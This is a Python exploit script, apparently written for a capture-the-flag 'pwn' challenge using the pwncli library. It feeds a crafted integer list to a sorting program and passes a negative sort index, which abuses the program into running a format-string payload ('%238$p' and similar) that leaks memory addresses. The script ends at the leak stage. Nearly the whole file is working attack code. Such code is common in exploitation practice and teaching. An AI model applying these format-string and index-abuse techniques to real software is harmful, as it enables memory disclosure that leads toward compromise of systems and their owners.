#!/usr/bin/env python3
# -*- coding: utf-8 -*-
#   expBy : @eastXueLian
#   Debug : ./exp.py debug  ./pwn -t -b b+0xabcd
#   Remote: ./exp.py remote ./pwn ip:port

from lianpwn import *
from pwncli import *
import random

cli_script()
set_remote_libc("libc.so.6")

io: tube = gift.io
elf: ELF = gift.elf
libc: ELF = gift.libc


def cmd(count, ints, idx):
    ru(b"How many ints?\n")
    sl(i2b(count))
    ru(b"Input ints (separate by space):\n")
    sl(ints)
    ru(b"Input sort type (1 = forward, 2 = reverse):\n")
    sl(i2b(idx))


length = 0x60
payload_list = [random.randint(1, 0xFFFFFF) for i in range(length)]

off = 4
payload = b"Trying to leak: " + b".%238$p.%239$p.%240$p."
payload += b"end   aaa"
for i in range(off, len(payload) + off, 4):
    payload_list[i // 4] = u32_ex((payload[i - off :])[:4])

payload_list = [str(i) for i in payload_list]
cmd(length, " ".join(payload_list).encode(), -9)

ru(b"Trying to leak: ")
leak = ru(b"end   aaa")
print(leak)
exit()

ia()
